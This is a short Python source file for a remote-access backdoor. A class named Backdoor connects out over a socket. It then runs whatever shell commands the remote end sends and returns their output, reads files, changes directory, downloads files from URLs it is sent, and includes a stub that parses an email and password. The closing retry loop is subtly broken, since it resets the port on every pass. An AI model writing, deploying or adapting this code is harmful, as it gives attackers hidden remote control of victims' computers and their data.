import socket
import subprocess
import os
import requests
import wget

class Backdoor:
    def __init__(self, ip, port):
        try:
            self.ip = ip
            self.port = port
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((ip, port))
            print('[+] Connected to ' + str(ip))
            self.commands()
        except Exception as e:
            print('[-] Error: ', e)

    def commands(self):
        global downloadURL
        command = self.s.recv(8192)
        output = self.terminal_execute(command)
        self.s.send(output)
        counter = 1
        while command:
            try:
                command = self.s.recv(8192)
                command = command.decode()
                if command[0:2] == 'cd':
                    command = command.split(' ')
                    result = self.change_cwd(command[1])
                    self.s.send(result.encode())
                elif command[0:3] == 'cat':
                    text = ''.join(os.popen(command).readlines())
                    self.s.send(text.encode())
                elif command[0:16] == 'email_validation':
                    email, password = command[16:].split(" ")
                elif command[0:8] == 'download':
                    downloadURL = command[9:]
                    self.download(downloadURL)
                    self.s.send(f'[+] Successfully downloaded {downloadURL}'.encode())
                else:
                    output = self.terminal_execute(command)
                    self.s.send(output)
            except Exception as e:
                self.s.send(f"[-] Invalid command: {e}".encode())

    def terminal_execute(self, command):
        try:
            if subprocess.getstatusoutput(command)[0] == 0:
                return subprocess.check_output(command, shell=True)
            else:
                return "[-] Error".encode()
        except:
            self.s.send("[-] Error".encode())

    def download(self, url):
        filename = url.split("/")[-1]
        wget.download(url, filename)

    def change_cwd(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

while True:
    port = 8080
    try:
        backdoor = Backdoor(socket.gethostbyname(socket.gethostname()), port)
        break
    except:
        port += 1